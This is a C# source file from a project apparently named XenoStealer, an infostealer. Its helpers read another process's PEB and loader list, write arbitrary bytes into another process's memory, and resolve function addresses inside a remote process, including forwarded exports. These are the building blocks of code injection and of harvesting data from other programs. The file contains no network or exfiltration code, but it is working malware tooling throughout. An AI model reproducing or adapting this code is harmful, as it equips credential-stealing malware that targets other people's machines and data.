using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using static XenoStealer.InternalStructs;

namespace XenoStealer
{
    public class Utils64
    {

        public static string GetProcessDesktopName64(IntPtr hProcess)
        {
            if (hProcess == IntPtr.Zero)
            {
                return null;
            }
            ulong PebBaseAddress = 0;
            UIntPtr Rread_out = UIntPtr.Zero;
            if (Environment.Is64BitProcess)
            {
                InternalStructs.PROCESS_BASIC_INFORMATION PBI = new InternalStructs.PROCESS_BASIC_INFORMATION();
                uint PBI_size = (uint)Marshal.SizeOf(PBI);
                uint NTread_out = 0;
                if (NativeMethods.NtQueryPbi64From64(hProcess, InternalStructs.PROCESSINFOCLASS.ProcessBasicInformation, ref PBI, PBI_size, ref NTread_out) != 0 || PBI.PebBaseAddress == IntPtr.Zero)
                {
                    return null;
                }
                PebBaseAddress = (ulong)PBI.PebBaseAddress;
            }
            else
            {
                InternalStructs64.PROCESS_BASIC_INFORMATION64 PBI = new InternalStructs64.PROCESS_BASIC_INFORMATION64();
                uint PBI_size = (uint)Marshal.SizeOf(PBI);
                uint NTread_out = 0;
                if (SpecialNativeMethods.NtQueryPBI64From32(hProcess, InternalStructs.PROCESSINFOCLASS.ProcessBasicInformation, ref PBI, PBI_size, ref NTread_out) != 0 || PBI.PebBaseAddress == 0)
                {
                    return null;
                }
                PebBaseAddress = PBI.PebBaseAddress;
            }

            if (PebBaseAddress == 0)
            {
                return null;
            }

            ulong RTLaddr = InternalStructs64.GetRTL64(PebBaseAddress);

            int pRTLDataSize = Marshal.SizeOf(typeof(ULONGRESULT));
            IntPtr pRTLData = Marshal.AllocHGlobal(pRTLDataSize);

            if (!ReadProperBitnessProcessMemory(hProcess, RTLaddr, pRTLData, (UIntPtr)pRTLDataSize, ref Rread_out))
            {
                Marshal.FreeHGlobal(pRTLData);
                return null;
            }

            ulong pRTL64 = Marshal.PtrToStructure<ULONGRESULT>(pRTLData).Value;
            Marshal.FreeHGlobal(pRTLData);

            int RTLDataSize = Marshal.SizeOf<InternalStructs64.RTL_USER_PROCESS_PARAMETERS64>();
            IntPtr RTLData = Marshal.AllocHGlobal(RTLDataSize);

            if (!ReadProperBitnessProcessMemory(hProcess, pRTL64, RTLData, (UIntPtr)RTLDataSize, ref Rread_out))
            {
                Marshal.FreeHGlobal(RTLData);
                return null;
            }
            InternalStructs64.RTL_USER_PROCESS_PARAMETERS64 RTL = Marshal.PtrToStructure<InternalStructs64.RTL_USER_PROCESS_PARAMETERS64>(RTLData);
            Marshal.FreeHGlobal(RTLData);

            IntPtr unicodeStringPtr = Marshal.AllocHGlobal(RTL.DesktopInfo.Length);

            if (!ReadProperBitnessProcessMemory(hProcess, RTL.DesktopInfo.Buffer, unicodeStringPtr, (UIntPtr)RTL.DesktopInfo.Length, ref Rread_out))
            {
                Marshal.FreeHGlobal(unicodeStringPtr);
                return null;
            }

            string desktopName = Marshal.PtrToStringUni(unicodeStringPtr, RTL.DesktopInfo.Length / 2);//divide by 2 for real string length (its unicode)

            Marshal.FreeHGlobal(unicodeStringPtr);

            return desktopName;

        }

        public static bool WriteBytesToProcess64(IntPtr handle, ulong address, byte[] data)
        {
            IntPtr dataPtr = Marshal.AllocHGlobal(data.Length);
            Marshal.Copy(data, 0, dataPtr, data.Length);
            IntPtr BytesWritten;
            bool result;
            if (Environment.Is64BitProcess)
            {
                result = NativeMethods.WriteProcessMemory(handle, (IntPtr)address, dataPtr, (IntPtr)data.Length, out BytesWritten);
            }
            else
            {
                ulong len = 0;
                int WriteVirtualMemoryStatus = SpecialNativeMethods.WriteProcessMemory64From32(handle, address, dataPtr, (ulong)data.Length, ref len);
                result = WriteVirtualMemoryStatus == 0;
                if (!result)
                {
                    NativeMethods.SetLastError((uint)WriteVirtualMemoryStatus);
                }
                BytesWritten = (IntPtr)len;
            }

            Marshal.FreeHGlobal(dataPtr);
            return result && BytesWritten == (IntPtr)data.Length;
        }


        private static bool ReadProperBitnessProcessMemory(IntPtr hProcess, ulong lpBaseAddress, IntPtr lpBuffer, UIntPtr dwSize, ref UIntPtr lpNumberOfBytesRead)
        {
            if (Environment.Is64BitProcess)
            {
                return NativeMethods.ReadProcessMemory(hProcess, (IntPtr)lpBaseAddress, lpBuffer, dwSize, ref lpNumberOfBytesRead);
            }
            else
            {
                ulong NumberOfBytesRead = 0;
                int ErrorResult = SpecialNativeMethods.ReadProcessMemory64From32(hProcess, lpBaseAddress, lpBuffer, (ulong)dwSize, ref NumberOfBytesRead);
                bool result = ErrorResult == 0;
                if (!result)
                {
                    NativeMethods.SetLastError((uint)ErrorResult);
                }
                lpNumberOfBytesRead = (UIntPtr)NumberOfBytesRead;
                return result;
            }
        }

        public static ulong GetRemoteModuleHandle64Bit(IntPtr hProcess, string DllBaseName, int max_flink_count = 600)
        {
            if (hProcess == IntPtr.Zero)
            {
                throw new Exception("The supplied hProcess is Null!");
            }
            ulong PebBaseAddress = 0;
            UIntPtr Rread_out = UIntPtr.Zero;
            if (Environment.Is64BitProcess)
            {
                InternalStructs.PROCESS_BASIC_INFORMATION PBI = new InternalStructs.PROCESS_BASIC_INFORMATION();
                uint PBI_size = (uint)Marshal.SizeOf(PBI);
                uint NTread_out = 0;
                if (NativeMethods.NtQueryPbi64From64(hProcess, InternalStructs.PROCESSINFOCLASS.ProcessBasicInformation, ref PBI, PBI_size, ref NTread_out) != 0 || PBI.PebBaseAddress == IntPtr.Zero)
                {
                    throw new Exception("couldnt read PBI from process!");
                }
                PebBaseAddress = (ulong)PBI.PebBaseAddress;
            }
            else
            {
                InternalStructs64.PROCESS_BASIC_INFORMATION64 PBI = new InternalStructs64.PROCESS_BASIC_INFORMATION64();
                uint PBI_size = (uint)Marshal.SizeOf(PBI);
                uint NTread_out = 0;
                if (SpecialNativeMethods.NtQueryPBI64From32(hProcess, InternalStructs.PROCESSINFOCLASS.ProcessBasicInformation, ref PBI, PBI_size, ref NTread_out) != 0 || PBI.PebBaseAddress == 0)
                {
                    throw new Exception("couldnt read PBI from process!");
                }
                PebBaseAddress = PBI.PebBaseAddress;
            }

            if (PebBaseAddress == 0)
            {
                return 0;
            }

            ulong ldrAddr = InternalStructs64.GetLdr64(PebBaseAddress);
            int pLdrDataSize = Marshal.SizeOf(typeof(ULONGRESULT));
            IntPtr pLdrData = Marshal.AllocHGlobal(pLdrDataSize);

            if (!ReadProperBitnessProcessMemory(hProcess, ldrAddr, pLdrData, (UIntPtr)pLdrDataSize, ref Rread_out))
            {
                Marshal.FreeHGlobal(pLdrData);
                throw new Exception("couldnt read pLdrData. ERR CODE: " + Marshal.GetLastWin32Error());
            }

            ulong pLdr64 = Marshal.PtrToStructure<ULONGRESULT>(pLdrData).Value;
            Marshal.FreeHGlobal(pLdrData);

            if (pLdr64 == 0)
            {
                return 0;
            }

            if (!ReadProperBitnessProcessMemory(hProcess, ldrAddr, pLdrData, (UIntPtr)pLdrDataSize, ref Rread_out))
            {
                Marshal.FreeHGlobal(pLdrData);
                throw new Exception("couldnt read pLdrData. ERR CODE: " + Marshal.GetLastWin32Error());
            }

            InternalStructs64.PEB_LDR_DATA64 ldr64;

            int ldr64Size = Marshal.SizeOf(typeof(InternalStructs64.PEB_LDR_DATA64));
            IntPtr ldr64addr = Marshal.AllocHGlobal(ldr64Size);

            if (!ReadProperBitnessProcessMemory(hProcess, pLdr64, ldr64addr, (UIntPtr)ldr64Size, ref Rread_out))
            {
                Marshal.FreeHGlobal(ldr64addr);
                throw new Exception("couldnt read ldr64. ERR CODE: " + Marshal.GetLastWin32Error());
            }

            ldr64 = Marshal.PtrToStructure<InternalStructs64.PEB_LDR_DATA64>(ldr64addr);
            Marshal.FreeHGlobal(ldr64addr);

            ulong entry = ldr64.InLoadOrderModuleList.Flink;
            ulong head = (uint)ldrAddr + (uint)Marshal.OffsetOf(typeof(InternalStructs64.PEB_LDR_DATA64), "InLoadOrderModuleList");

            int LdrDataTableSize = Marshal.SizeOf(typeof(InternalStructs64.LDR_DATA_TABLE_ENTRY64_SNAP));
            IntPtr LdrDataTableAddr = Marshal.AllocHGlobal(LdrDataTableSize);

            ulong hModule = 0;
            int count = 0;
            while (entry != head && count < max_flink_count)
            {
                count++;
                if (!ReadProperBitnessProcessMemory(hProcess, entry, LdrDataTableAddr, (UIntPtr)LdrDataTableSize, ref Rread_out))
                {
                    break;
                }
                InternalStructs64.LDR_DATA_TABLE_ENTRY64_SNAP LdrDataTable = Marshal.PtrToStructure<InternalStructs64.LDR_DATA_TABLE_ENTRY64_SNAP>(LdrDataTableAddr);

                if (DllBaseName == null)
                {
                    hModule = LdrDataTable.DllBase;
                    break;
                }

                entry = LdrDataTable.InLoadOrderLinks.Flink;

                if ((LdrDataTable.BaseDllName.Length / 2) != DllBaseName.Length)
                {
                    continue;
                }

                IntPtr currentModuleNameBufferAddr = Marshal.AllocHGlobal(LdrDataTable.BaseDllName.Length);
                if (!ReadProperBitnessProcessMemory(hProcess, LdrDataTable.BaseDllName.Buffer, currentModuleNameBufferAddr, (UIntPtr)LdrDataTable.BaseDllName.Length, ref Rread_out))
                {
                    Marshal.FreeHGlobal(currentModuleNameBufferAddr);
                    break;
                }
                string baseDllname = Marshal.PtrToStringUni(currentModuleNameBufferAddr, LdrDataTable.BaseDllName.Length / 2);
                Marshal.FreeHGlobal(currentModuleNameBufferAddr);
                if (baseDllname.ToLower() == DllBaseName.ToLower())
                {
                    hModule = LdrDataTable.DllBase;
                    break;
                }
            }
            Marshal.FreeHGlobal(LdrDataTableAddr);
            return hModule;
        }

        private static string ReadRemoteAnsiString64(IntPtr hProcess, ulong lpAddress)
        {
            string result = "";
            UIntPtr Rread_out = UIntPtr.Zero;
            IntPtr byteBuffer = Marshal.AllocHGlobal(1);
            while (true)
            {
                if (!ReadProperBitnessProcessMemory(hProcess, lpAddress, byteBuffer, (UIntPtr)1, ref Rread_out))
                {
                    Marshal.FreeHGlobal(byteBuffer);
                    throw new Exception("couldnt read AnsiString. ERR CODE: " + Marshal.GetLastWin32Error());
                }
                byte Ch = Marshal.ReadByte(byteBuffer);
                if (Ch == 0)
                {
                    break;
                }
                result += (char)Ch;
                lpAddress += 1;
            }
            return result;
        }

        public static ulong GetNtHeader64Addr(IntPtr hProcess, ulong hModule)
        {
            int dosHeaderSize = Marshal.SizeOf(typeof(IMAGE_DOS_HEADER));
            IntPtr dosHeaderaddr = Marshal.AllocHGlobal(dosHeaderSize);
            UIntPtr Rread_out = UIntPtr.Zero;
            if (!ReadProperBitnessProcessMemory(hProcess, hModule, dosHeaderaddr, (UIntPtr)dosHeaderSize, ref Rread_out))
            {
                Marshal.FreeHGlobal(dosHeaderaddr);
                throw new Exception("couldnt read DosHeader. ERR CODE: " + Marshal.GetLastWin32Error());
            }
            IMAGE_DOS_HEADER dosHeader = Marshal.PtrToStructure<IMAGE_DOS_HEADER>(dosHeaderaddr);
            Marshal.FreeHGlobal(dosHeaderaddr);
            return hModule + (uint)dosHeader.e_lfanew;
        }

        public static InternalStructs64.IMAGE_NT_HEADERS64 GetNtHeader64(IntPtr hProcess, ulong hModule)
        {

            UIntPtr Rread_out = UIntPtr.Zero;
            int ntHeaderSize = Marshal.SizeOf(typeof(InternalStructs64.IMAGE_NT_HEADERS64));
            IntPtr ntHeaderaddr = Marshal.AllocHGlobal(ntHeaderSize);
            if (!ReadProperBitnessProcessMemory(hProcess, GetNtHeader64Addr(hProcess, hModule), ntHeaderaddr, (UIntPtr)ntHeaderSize, ref Rread_out))
            {
                Marshal.FreeHGlobal(ntHeaderaddr);
                throw new Exception("couldnt read NTHeader. ERR CODE: " + Marshal.GetLastWin32Error());
            }
            InternalStructs64.IMAGE_NT_HEADERS64 ntHeader = Marshal.PtrToStructure<InternalStructs64.IMAGE_NT_HEADERS64>(ntHeaderaddr);
            Marshal.FreeHGlobal(ntHeaderaddr);
            return ntHeader;
        }

        public static ulong GetRemoteProcAddress64Bit(IntPtr hProcess, ulong hModule, string FunctionName)
        {
            if (hModule == 0)
            {
                throw new Exception("couldnt read hModule is null or 0.");
            }

            UIntPtr Rread_out = UIntPtr.Zero;

            InternalStructs64.IMAGE_NT_HEADERS64 ntHeader = GetNtHeader64(hProcess, hModule);

            int IMAGE_DIRECTORY_ENTRY_EXPORT = 0;

            IMAGE_DATA_DIRECTORY dataTable = ntHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

            if (dataTable.Size == 0 || dataTable.VirtualAddress == 0)
            {
                return 0;
            }

            int explortDirSize = Marshal.SizeOf(typeof(IMAGE_EXPORT_DIRECTORY));
            IntPtr exportDiraddr = Marshal.AllocHGlobal(explortDirSize);

            if (!ReadProperBitnessProcessMemory(hProcess, (hModule + dataTable.VirtualAddress), exportDiraddr, (UIntPtr)explortDirSize, ref Rread_out))
            {
                Marshal.FreeHGlobal(exportDiraddr);
                throw new Exception("couldnt read IMAGE EXPORT DIRECTORY. ERR CODE: " + Marshal.GetLastWin32Error());
            }

            IMAGE_EXPORT_DIRECTORY exportDir = Marshal.PtrToStructure<IMAGE_EXPORT_DIRECTORY>(exportDiraddr);
            Marshal.FreeHGlobal(exportDiraddr);
            if (exportDir.NumberOfNames == 0)
            {
                return 0;
            }

            int rvaTableSize = (int)exportDir.NumberOfFunctions * Marshal.SizeOf(typeof(int));
            IntPtr rvaTableAddr = Marshal.AllocHGlobal(rvaTableSize);

            if (!ReadProperBitnessProcessMemory(hProcess, (hModule + exportDir.AddressOfFunctions), rvaTableAddr, (UIntPtr)rvaTableSize, ref Rread_out))
            {
                Marshal.FreeHGlobal(rvaTableAddr);
                throw new Exception("couldnt read RVA table. ERR CODE: " + Marshal.GetLastWin32Error());
            }
            uint[] rvaTable = new uint[(int)exportDir.NumberOfFunctions];
            for (int i = 0; i < (int)exportDir.NumberOfFunctions; i++)
            {
                rvaTable[i] = Marshal.PtrToStructure<UINTRESULT>(rvaTableAddr + (i * 4)).Value;
            }
            Marshal.FreeHGlobal(rvaTableAddr);

            int ordTableSize = (int)exportDir.NumberOfFunctions * Marshal.SizeOf(typeof(short));
            IntPtr ordTableAddr = Marshal.AllocHGlobal(ordTableSize);
            if (!ReadProperBitnessProcessMemory(hProcess, (hModule + exportDir.AddressOfNameOrdinals), ordTableAddr, (UIntPtr)ordTableSize, ref Rread_out))
            {
                Marshal.FreeHGlobal(ordTableAddr);
                throw new Exception("couldnt read ORD table. ERR CODE: " + Marshal.GetLastWin32Error());
            }
            ushort[] ordTable = new ushort[(int)exportDir.NumberOfFunctions];
            for (int i = 0; i < (int)exportDir.NumberOfFunctions; i++)
            {
                ordTable[i] = Marshal.PtrToStructure<USHORTRESULT>(ordTableAddr + (i * 2)).Value;
            }
            Marshal.FreeHGlobal(ordTableAddr);

            int nameTableSize = (int)exportDir.NumberOfNames * Marshal.SizeOf(typeof(int));
            IntPtr nameTableAddr = Marshal.AllocHGlobal(nameTableSize);
            if (!ReadProperBitnessProcessMemory(hProcess, (hModule + exportDir.AddressOfNames), nameTableAddr, (UIntPtr)nameTableSize, ref Rread_out))
            {
                Marshal.FreeHGlobal(nameTableAddr);
                throw new Exception("couldnt read NAME table. ERR CODE: " + Marshal.GetLastWin32Error());
            }
            uint[] nameTable = new uint[(int)exportDir.NumberOfNames];
            for (int i = 0; i < (int)exportDir.NumberOfNames; i++)
            {
                nameTable[i] = Marshal.PtrToStructure<UINTRESULT>(nameTableAddr + (i * 4)).Value;
            }
            Marshal.FreeHGlobal(nameTableAddr);

            int nameBufferLen = FunctionName.Length + 1;//for the string terminating null byte
            IntPtr nameBuffer = Marshal.AllocHGlobal(nameBufferLen);
            ulong result = 0;
            for (int i = 0; i < nameTable.Length; i++)
            {
                if (!ReadProperBitnessProcessMemory(hProcess, (hModule + nameTable[i]), nameBuffer, (UIntPtr)nameBufferLen, ref Rread_out))
                {
                    Marshal.FreeHGlobal(nameBuffer);
                    throw new Exception("couldnt read name buffer. ERR CODE: " + Marshal.GetLastWin32Error());
                }
                byte SecondLastChar = Marshal.ReadByte(nameBuffer + nameBufferLen - 2);
                byte lastChar = Marshal.ReadByte(nameBuffer + nameBufferLen - 1);
                if (lastChar == 0 && SecondLastChar != 0) //make sure the last char is null and the second last char is not null
                {
                    uint functionAddress = (uint)rvaTable[ordTable[i]];
                    string RetrivedFunctionName = Marshal.PtrToStringAnsi(nameBuffer);

                    if (RetrivedFunctionName == FunctionName)
                    {

                        if (functionAddress >= dataTable.VirtualAddress && functionAddress < dataTable.VirtualAddress + dataTable.Size)
                        {
                            string ForwarderString = ReadRemoteAnsiString64(hProcess, (hModule + functionAddress));
                            if (!ForwarderString.Contains("."))
                            {
                                Marshal.FreeHGlobal(nameBuffer);
                                throw new Exception("Couldnt the Forwarder info!");
                            }
                            string[] Forwarder_info = ForwarderString.Split('.');
                            string fowardedDll = string.Join(".", Forwarder_info.Take(Forwarder_info.Length - 1).ToArray()) + ".dll";
                            string SearchElement = Forwarder_info[Forwarder_info.Length - 1];
                            if (SearchElement.Contains("#"))
                            {
                                Marshal.FreeHGlobal(nameBuffer);
                                throw new Exception("Ordinal forwarder function is not supported at this time!");
                            }
                            else
                            {
                                ulong newModuleAddress = GetRemoteModuleHandle64Bit(hProcess, fowardedDll);
                                if (newModuleAddress == 0)
                                {
                                    Marshal.FreeHGlobal(nameBuffer);
                                    throw new Exception("Couldnt the Forwarder dll!");
                                }
                                return GetRemoteProcAddress64Bit(hProcess, newModuleAddress, SearchElement);
                            }
                        }
                        else
                        {
                            result = hModule + functionAddress;
                        }
                        break;
                    }
                }
            }
            Marshal.FreeHGlobal(nameBuffer);

            return result;

        }
    }
}
